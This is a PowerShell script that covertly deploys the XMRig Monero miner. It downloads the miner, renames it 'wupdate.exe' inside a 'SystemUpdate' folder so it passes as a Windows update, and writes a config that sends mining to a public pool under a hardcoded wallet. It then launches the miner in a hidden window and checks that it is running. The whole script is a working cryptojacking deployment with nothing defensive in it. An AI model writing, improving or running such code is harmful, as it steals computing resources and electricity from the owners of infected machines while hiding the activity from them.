# === XMRig Deploy DEBUG v9 - All English, No Accents ===
$installPath = "C:\ProgramData\SystemUpdate"
$debugLog = "$installPath\deploy-debug.log"

function Write-DebugLog {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp | $message" | Add-Content -Path $debugLog -Encoding UTF8 -Force
    Write-Host "$timestamp | $message"
}

Write-DebugLog "=== START DEBUG v9 ==="
Write-DebugLog "User: $(whoami)"
Write-DebugLog "Current location: $(Get-Location)"

New-Item -ItemType Directory -Path $installPath -Force | Out-Null
Write-DebugLog "Folder created: $installPath"

# Download and extract
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$zipPath = "$installPath\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
Remove-Item $zipPath -Force

Copy-Item "$installPath\xmrig-6.25.0\xmrig.exe" "$installPath\wupdate.exe" -Force
Write-DebugLog "wupdate.exe created"

# Create config with maximum reliability (no heredoc issues)
$configPath = "$installPath\config.json"

$configJson = '{
    "autosave": true,
    "cpu": {
        "max-threads-hint": 50
    },
    "pools": [
        {
            "url": "pool.supportxmr.com:3333",
            "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ],
    "background": false,
    "log-file": null
}'

# Write using .NET - most reliable method
[System.IO.File]::WriteAllText($configPath, $configJson, [System.Text.Encoding]::UTF8)

Write-DebugLog "config.json written with WriteAllText"

# Strong test
if (Test-Path $configPath) {
    $size = (Get-Item $configPath).Length
    $firstLine = (Get-Content $configPath -First 1).Trim()
    Write-DebugLog "TEST SUCCESS: config exists | Size: $size bytes | First line: $firstLine"
} else {
    Write-DebugLog "TEST FAILED: config.json still does not exist"
}

# Launch with full path and working directory
$exePath = "$installPath\wupdate.exe"

Write-DebugLog "Launching miner..."

Start-Process -FilePath $exePath `
    -WorkingDirectory $installPath `
    -ArgumentList "-B -c config.json" `
    -WindowStyle Hidden

Write-DebugLog "Start-Process executed"

Start-Sleep -Seconds 10

$proc = Get-Process wupdate -ErrorAction SilentlyContinue
if ($proc) {
    Write-DebugLog "SUCCESS: wupdate.exe is running (PID $($proc.Id))"
} else {
    Write-DebugLog "FAIL: wupdate.exe not found after 10 seconds"
}

Write-DebugLog "=== END DEBUG v9 ==="
